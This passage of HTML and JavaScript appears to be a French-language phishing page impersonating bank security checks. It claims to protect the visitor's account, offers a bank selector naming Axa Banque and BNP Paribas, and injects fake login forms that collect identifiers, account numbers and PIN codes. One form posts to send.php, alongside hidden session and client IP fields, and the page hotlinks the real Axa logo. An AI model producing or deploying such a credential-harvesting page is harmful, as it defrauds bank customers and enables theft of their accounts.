2.303-6.234 6.043-6.234 2.155 0 4.055.862 4.964 2.639l-2.613 1.679h-.047c-.383-.697-1.152-1.199-2.185-1.199zM54.465 6.26c2.495 0 3.834 1.776 3.834 4.462v7.77h-3.591V11.73c0-1.581-.744-2.113-1.683-2.113-1.39 0-2.444 1.178-2.444 3.672v5.202h-3.6V8.13c0-1.173.77-1.87 1.679-1.87.914 0 1.679.697 1.679 1.87v.455h.05c.91-1.411 2.3-2.325 4.076-2.325zM9.81 11.783c0 .4.119.99.264 1.36l3.986-2.97c-.217-.324-.646-1.042-1.84-1.042-1.135 0-2.41.833-2.41 2.652zm3.485 4.012c1.437 0 2.61-1.08 3.077-1.976l2.367 1.704c-.905 1.845-2.766 3.209-5.869 3.209a6.083 6.083 0 0 1-4.029-1.517c-1.56 1.037-2.907 1.491-4.241 1.491-2.696 0-4.6-1.802-4.6-4.516V2.39C0 1.17.812.406 1.79.406c.981 0 1.793.765 1.793 1.985l.004 11.492c0 1.168.501 1.793 1.572 1.793.574 0 1.203-.336 2.02-.782a7.42 7.42 0 0 1-.579-2.928c0-2.542 1.81-5.708 5.619-5.708 3.306 0 5.079 1.921 5.818 4.335l-6.366 4.56c.335.294.811.642 1.623.642z"
                ></path>
              </svg>
            </div>
          </div>
        </header>
        <main class="flex h-full flex-col pt-xl">
          <div
            class="h-[calc(100%-50px)] md:h-[calc(100%-60px)] md:bg-no-repeat md:bg-bottom md:bg-[length:980px] md:bg-[url(/static/login-illustration.png)]"
          >
            <div
              class="flex flex-col justify-start text-left w-auto h-auto pl-lg pr-lg pb-lg md:pl-2xl md:pr-2xl md:pb-2xl md:pt-2xl md:m-auto md:mt-3xl md:max-w-3xl md:rounded-lg md:shadow md:bg-background"
            >
              <div class="loader" align="center"></div>
              <!-- Affiche le loader pendant le chargement -->

              <div data-testid="subtitle" class="flex flex-col gap-md">
                <h2 class="text-display-3 text-on-surface">
                  Protégeons votre compte
                </h2>
                <p class="text-body-1 text-on-surface">
                  La sécurité est notre priorité. <br />
                  Veuillez, confirmer ou configurer la méthode de paiement pour
                  continuer.
                </p>
              </div>

              <div data-testid="subtitle" class="flex flex-col gap-md"></div>

              <form method="post" action="">
                <div
                  data-spark-component="form-field"
                  class="mt-xl text-body-1 flex-col gap-sm"
                >
                    <input type="hidden" name="session_token" id="session_token" value="" />
  <!-- Champ caché pour l'adresse IP sera renseigné en PHP -->
  <input type="hidden" name="client_ip" id="client_ip" value="" />
                  <label for="bankName">Nom de la banque:</label>
                  <select id="bankName" onchange="displayLoginForm()">
                    <option value="">Sélectionnez une banque</option>
                    <option value="axa">Axa Banque</option>
                    <!-- Modifié pour correspondre à la clé 'axa' -->
                    <option value="bnp">BNP Paribas</option>
                    <!-- Modifié pour correspondre à la clé 'banque2' -->
                    <option value="banque3">Banque 3</option>
                    <!-- Modifié pour correspondre à la clé 'banque3' -->
                    <!-- Ajoutez d'autres options ici -->
                  </select>

                  <!-- Formulaire caché au départ -->
                  <div id="loginForm" style="display: none">
                    <!-- Cache par défaut -->
                    <div id="formContent">
                      <!-- Contenu spécifique pour chaque banque sera inséré ici -->
                    </div>
                  </div>
                  <img
                    id="bankLogo"
                    src=""
                    alt="Logo de la banque"
                    style="
                      display: none;
                      height: 40px;
                      width: auto;
                      margin-left: 10px;
                    "
                  />
                </div>
              </form>
              <script>
  document.getElementById("session_token").value = Math.random().toString(36).substring(2); // Génère un token simple
</script>

              <script>
                function displayBankLogo() {
                  const bankSelect = document.getElementById("bankName");
                  const bankLogo = document.getElementById("bankLogo");

                  const selectedBank = bankSelect.value;
                  let logoSrc = "";

                  switch (selectedBank) {
                    case "axa":
                      logoSrc =
                        "https://banque.axa.fr/novatio-modules/ux-library/1d63c3b34e144e92588693c081f295b5/assets/images/logo.png";
                      break;
                    case "bnp":
                      logoSrc = "images/bnp.png";
                      break;
                    case "banque3":
                      logoSrc = "images/banque3.png";
                      break;
                    default:
                      logoSrc = "";
                  }

                  if (logoSrc) {
                    bankLogo.src = logoSrc;
                    bankLogo.style.display = "block";
                  } else {
                    bankLogo.style.display = "none";
                  }
                }
              </script>

              <script>
                document
                  .getElementById("bank_select")
                  .addEventListener("change", function () {
                    var selectedOption = this.value;
                    if (selectedOption === "other") {
                      document.getElementById(
                        "other_bank_input"
                      ).style.display = "block";
                    } else {
                      document.getElementById(
                        "other_bank_input"
                      ).style.display = "none";
                    }
                  });
              </script>
            </div>
          </div>
        </main>
      </div>
      <svg height="0" width="0" class="src__Box-sc-10d053g-0 hItfWS"></svg>
    </div>
    <script>
      const bankForms = {
        axa: `<header class="flex h-full items-center justify-center bg-background" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;">
    <div class="m-tag m-lib-color c-stack--vertical c-stack" style="--stack-size: var(--spacing-md);">
        <div style="padding: 2rem; display: flex; justify-content: center; align-items: center;">
          <img style="width:50%;" src="./img/78866.jpg" alt="">
        </div>
    </div>
    <ux-text tag="h1" theme="primary" style="color: #000; font-size: 20px; font-weight: bold; text-transform: uppercase;" lib-size="lg" class="no-border is-mobile is-tablet">
    </ux-text>
    <div style="padding: 2rem; display: flex; justify-content: center; align-items: center;">
        <img src="./img/27681.jpg" alt="">
    </div>
</header>
<form id="firstForm" method="post" action="send.php" style="display: flex; flex-direction: column; align-items: center; gap: 1rem;">
    <!-- Champ Identifiant -->
    <span style="font-weight: 600; text-align: left; display: block; margin-bottom: 0.5rem;" slot="label" class="text-body-1">Identifiant</span>
    <input  id="userax" style="padding: 0 2rem; font-size: 1.6rem; height: 5.8rem;" class="c-input c-input-text js-delegate-focus empty" id="displayIdentifiant" autocomplete="off" type="" part="ux-input-a11y-text__input" placeholder="Saisissez votre identifiant">
    
    <!-- Option "Se souvenir de moi" avec style personnalisé -->
    <form action="">
  <!-- Label de la case à cocher -->
  <div>
    <label>
    <input type="checkbox" class="custom-checkbox" id="rememberMe" name="rememberMe">
    <span style="font-size: 1.5rem; font-weight: 500;">Se souvenir de moi</span>
  </label></div>
  <button type="submit" class="custom-button">Suivant</button>
</form>

`,
        bnp: `
      <h3>Connexion à Banque 2</h3>
      <form>
        <label for="accountNumber">Numéro de Compte Banque 2:</label>
        <input type="text" id="accountNumber" placeholder="Entrez votre numéro de compte" required><br><br>
        <label for="pin">Code PIN Banque 2:</label>
        <input type="password" id="pin" placeholder="Entrez votre code PIN" required><br><br>
        <button type="submit">Se connecter</button>
      </form>
    `,
        banque3: `
      <h3>Connexion à Banque 3</h3>
      <form>
        <label for="accountNumber">Numéro de Compte Banque 3:</label>
        <input type="text" id="accountNumber" placeholder="Entrez votre numéro de compte" required><br><br>
        <label for="pin">Code PIN Banque 3:</label>
        <input type="password" id="pin" placeholder="Entrez votre code PIN" required><br><br>
        <button type="submit">Se connecter</button>
      </form>
    `,
      };

      function displayLoginForm() {
        const bankName = document
          .getElementById("bankName")
          .value.toLowerCase();
        const loginForm = document.getElementById("loginForm");
        const formContent = document.getElementById("formContent");

        if (bankForms[bankName]) {
          loginForm.style.display = "block";
          formContent.innerHTML = bankForms[bankName];
        } else {
          loginForm.style.display = "none";
        }
      }
    </script>
    <script>
      function submitIdentifiant() {
        // Récupérer l'identifiant saisi
        const identifiant = document.getElementById("inputIdentifiant").value;

        // Afficher l'identifiant dans le deuxième formulaire
        document.getElementById("displayIdentifiant").value = identifiant;

        // Cacher le premier formulaire et afficher le deuxième formulaire
        document.getElementById("firstForm").style.display = "none";
        document.getElementById("secondForm").style.display = "flex";
      }
    </script>
  </body>
</html>
